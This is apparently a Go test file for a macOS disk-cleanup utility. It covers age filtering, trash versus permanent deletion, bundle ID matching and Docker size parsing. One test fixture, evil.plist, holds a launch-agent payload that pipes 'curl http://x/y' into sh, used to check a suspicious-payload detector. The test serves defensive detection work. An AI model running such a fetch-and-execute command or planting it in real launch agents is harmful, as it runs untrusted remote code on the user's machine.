package opti

import (
	"os"
	"path/filepath"
	"testing"
	"time"
)

func TestCleanMinAgeFiltersRecentItems(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)

	scratch := filepath.Join(home, "scratch")
	if err := os.MkdirAll(scratch, 0o755); err != nil {
		t.Fatal(err)
	}
	oldFile := filepath.Join(scratch, "old.txt")
	newFile := filepath.Join(scratch, "new.txt")
	if err := os.WriteFile(oldFile, []byte("old"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(newFile, []byte("new"), 0o644); err != nil {
		t.Fatal(err)
	}
	old := time.Now().Add(-10 * 24 * time.Hour)
	if err := os.Chtimes(oldFile, old, old); err != nil {
		t.Fatal(err)
	}

	cfg := Config{ExtraCleanTargets: []ConfigTarget{{Path: "~/scratch", Kind: "scratch", Category: "custom"}}}
	result, err := scanCleanable(false, cfg, 7*24*time.Hour)
	if err != nil {
		t.Fatal(err)
	}

	var sawOld, sawNew bool
	for _, item := range result.Items {
		switch item.Path {
		case oldFile:
			sawOld = true
		case newFile:
			sawNew = true
		}
	}
	if !sawOld {
		t.Fatal("expected old file to be cleanable")
	}
	if sawNew {
		t.Fatal("expected recent file to be skipped by MinAge filter")
	}
}

func TestCleanPermanentVsTrash(t *testing.T) {
	setup := func(t *testing.T) (string, string) {
		home := t.TempDir()
		t.Setenv("HOME", home)
		dir := filepath.Join(home, "scratch")
		if err := os.MkdirAll(dir, 0o755); err != nil {
			t.Fatal(err)
		}
		file := filepath.Join(dir, "blob")
		if err := os.WriteFile(file, []byte("data"), 0o644); err != nil {
			t.Fatal(err)
		}
		if _, err := SaveConfig(Config{UseTrash: true, ExtraCleanTargets: []ConfigTarget{{Path: "~/scratch", Kind: "scratch", Category: "custom"}}}); err != nil {
			t.Fatal(err)
		}
		return file, dir
	}

	t.Run("permanent default frees and keeps no restore point", func(t *testing.T) {
		file, _ := setup(t)
		result, err := Clean(CleanOptions{Execute: true, NoTrash: true})
		if err != nil {
			t.Fatal(err)
		}
		if result.Trashed {
			t.Error("expected permanent delete, got trashed")
		}
		if _, err := os.Stat(file); !os.IsNotExist(err) {
			t.Error("expected file to be deleted")
		}
		if ops, _ := ListOperations(); len(ops) != 0 {
			t.Errorf("expected no operations, got %d", len(ops))
		}
	})

	t.Run("--trash keeps a restorable operation", func(t *testing.T) {
		file, _ := setup(t)
		result, err := Clean(CleanOptions{Execute: true, NoTrash: false})
		if err != nil {
			t.Fatal(err)
		}
		if !result.Trashed || result.OperationID == "" {
			t.Error("expected trashed result with an operation id")
		}
		if _, err := os.Stat(file); !os.IsNotExist(err) {
			t.Error("expected file to be moved out of place")
		}
		if ops, _ := ListOperations(); len(ops) != 1 {
			t.Errorf("expected 1 operation, got %d", len(ops))
		}
	})
}

func TestLooksLikeBundleID(t *testing.T) {
	cases := map[string]bool{
		"com.foo.bar":      true,
		"com.foo.bar.help": true,
		"com.apple.finder": false,
		"foo":              false,
		"com.foo":          false,
		"":                 false,
	}
	for id, want := range cases {
		if got := looksLikeBundleID(id); got != want {
			t.Errorf("looksLikeBundleID(%q) = %v, want %v", id, got, want)
		}
	}
}

func TestIsInstalledBundleCoversHelpers(t *testing.T) {
	installed := map[string]bool{"com.foo.bar": true}
	if !isInstalledBundle("com.foo.bar.helper", installed) {
		t.Error("helper bundle should be covered by its parent app")
	}
	if isInstalledBundle("com.other.app", installed) {
		t.Error("unrelated bundle should not be considered installed")
	}
}

func TestSuspiciousPayload(t *testing.T) {
	dir := t.TempDir()
	bad := filepath.Join(dir, "evil.plist")
	good := filepath.Join(dir, "ok.plist")
	mustWrite(t, bad, `<plist><dict><key>ProgramArguments</key><array><string>/bin/sh</string><string>-c</string><string>curl http://x/y | sh</string></array></dict></plist>`)
	mustWrite(t, good, `<plist><dict><key>Program</key><string>/opt/homebrew/bin/watchman</string></dict></plist>`)

	if reason := suspiciousPayload(bad); reason == "" {
		t.Error("expected suspicious payload to be flagged")
	}
	if reason := suspiciousPayload(good); reason != "" {
		t.Errorf("expected benign payload, got reason %q", reason)
	}
}

func TestScaledSize(t *testing.T) {
	cases := map[string]int64{
		"1B":    1,
		"1KB":   1 << 10,
		"2MB":   2 << 20,
		"1.5GB": int64(1.5 * float64(int64(1)<<30)),
	}
	for input, want := range cases {
		got, err := parseDockerSize(input)
		if err != nil {
			t.Fatalf("parseDockerSize(%q): %v", input, err)
		}
		if got != want {
			t.Errorf("parseDockerSize(%q) = %d, want %d", input, got, want)
		}
	}
}
